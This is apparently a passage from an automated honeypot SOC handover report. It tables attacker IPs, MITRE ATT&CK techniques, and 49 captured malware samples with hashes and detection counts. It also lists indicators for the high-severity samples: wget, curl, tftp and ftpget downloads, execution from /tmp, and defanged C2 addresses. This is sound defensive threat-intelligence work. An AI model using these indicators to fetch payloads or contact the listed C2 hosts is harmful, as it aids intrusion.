| `159.65.233[.]253` | **8** | 2026-07-01 15:01 | 2026-07-01 18:25 | 7m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **7** | 2026-07-01 16:51 | 2026-07-01 18:44 | 6m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-07-01 15:38 | 2026-07-01 15:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]108` | **2** | 2026-07-01 16:16 | 2026-07-01 16:16 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-01 15:04 | 2026-07-01 15:40 | 1m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-01 17:53 | 2026-07-01 18:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-07-01 16:34 | 2026-07-01 17:01 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.162[.]240` | 1 | 2026-07-01 16:04 | 2026-07-01 16:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.157[.]229` | 1 | 2026-07-01 15:34 | 2026-07-01 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.72.209[.]56` | 1 | 2026-07-01 15:04 | 2026-07-01 15:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-07-01 17:11 | 2026-07-01 17:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.176.95[.]143` | 1 | 2026-07-01 16:19 | 2026-07-01 16:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.189.221[.]17` | 1 | 2026-07-01 16:02 | 2026-07-01 16:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.95.159[.]159` | 1 | 2026-07-01 15:59 | 2026-07-01 16:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.59[.]30` | 1 | 2026-07-01 16:55 | 2026-07-01 16:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.132.49[.]144` | 1 | 2026-07-01 17:40 | 2026-07-01 17:40 | 31s | 0 | `T1592` | 🟢 LOW |
| `43.226.40[.]202` | 1 | 2026-07-01 17:25 | 2026-07-01 17:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-01 16:07 | 2026-07-01 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.175.67[.]66` | 1 | 2026-07-01 15:46 | 2026-07-01 15:46 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | 1 | 2026-07-01 15:49 | 2026-07-01 15:49 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]39` | 1 | 2026-07-01 17:35 | 2026-07-01 17:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | 1 | 2026-07-01 18:41 | 2026-07-01 18:41 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |
| `117.50.157[.]229` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 3 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 16 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `92.118.39[.]49` | RO | DMZHOST | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 187 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 183 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 60 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 309 cases |
| Tool 34  | Credential Extractor        | ✅ 225 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 54 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 183 priority case(s) shown individually · 24 recon entry/entries in table (9 group(s) consolidating 107 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-01T20:02:09Z_
